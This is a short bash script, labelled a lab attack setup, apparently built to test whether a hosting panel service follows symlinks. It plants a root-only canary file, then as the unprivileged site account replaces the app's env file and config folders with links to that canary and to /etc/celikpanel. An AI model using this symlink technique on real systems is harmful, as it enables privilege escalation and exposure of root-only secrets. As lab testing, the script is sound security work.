# guest: LAB ATTACK SETUP (the lab acting as a malicious customer). A root-only canary file, then the
# site's own account replaces its old env path and its config folder with links to root-only content. Lab only.
set -u
U=$1; H=$(systemctl show celiksvc-1.service -p WorkingDirectory --value)
[ -d "$H" ] || H=$(getent passwd $U | cut -d: -f6)/apps/n8n
printf 'LAB_CANARY=root-only-canary-value\n' > /root/lab-canary.env; chmod 600 /root/lab-canary.env
echo "## app root $H (account $U)"; ls -la $H | head
cd /tmp
runuser -u $U -- sh -c "mkdir -p '$H/config' 2>/dev/null; ln -sfn /root/lab-canary.env '$H/config/app.env' && echo 'app.env -> canary link made by the site account'" 2>&1
runuser -u $U -- sh -c "ln -sfn /etc/celikpanel '$H/config.d' && echo 'config.d -> /etc/celikpanel link made'" 2>&1
runuser -u $U -- sh -c "mv '$H/config' '$H/config.orig' 2>/dev/null; ln -sfn /etc/celikpanel '$H/config' && echo 'config -> /etc/celikpanel link made'" 2>&1
ls -la $H | head -14
